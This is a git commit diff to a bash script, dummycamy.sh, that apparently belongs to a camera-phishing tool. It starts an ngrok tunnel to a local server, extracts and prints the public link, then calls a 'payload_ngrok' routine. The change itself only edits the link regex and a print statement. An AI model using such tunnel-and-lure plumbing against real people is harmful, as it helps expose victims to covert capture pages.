98a25f49149189fb031b7ad759739f882446f165
Amine Boutouil <amine_boutouil@outlook.com>
2022-04-22 14:03:57 +0000

    Update dummycamy.sh

--- dummycamy.sh
+++ dummycamy.sh
@@ -174,9 +174,9 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https:[^"]*.ngrok.io')
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m $link" 
 
 payload_ngrok
 checkfound
